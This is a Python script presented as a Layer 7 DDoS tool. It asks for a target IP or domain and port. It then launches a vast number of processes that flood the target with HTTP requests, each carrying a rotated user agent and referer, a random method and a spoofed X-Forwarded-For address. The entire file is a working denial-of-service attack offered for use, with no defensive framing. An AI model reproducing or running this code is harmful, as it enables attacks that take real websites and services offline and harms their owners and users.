import socket
import os
from time import sleep
import multiprocessing
import random
import platform
from headers import headers_useragents
from referers import headers_referers

http_met=['OPTIONS' ,'GET' ,'HEAD','PUT','POST','DELETE' ,'PATCH']

'''  Layer 7 DDoS '''
print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 10300000000000")
  except Exception as e:
    print(e)
    print("Could not start the script")
else:
  print("Your system is not Linux, You may not be able to run this script in some systems")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  while True:
    connection = "Connection:"
    ua = "User-Agent:" + headers_useragents[random.randint(0,3176)]
    referer = "Referer:" + headers_referers[random.randint(0, 172)]
    forward = "X-Forwarded-For: " + randomip() + "\r\n"
    get_host = http_met[random.randint(0,6)] + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
    request = get_host + ua + referer  + connection + forward + "\r\n\r\n"
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("Welcome To DDoS on Cloud\n")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
print("[>>>] Starting the attack [<<<]")
sleep(1)

def send2attack():
  for i in range(5000000000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack()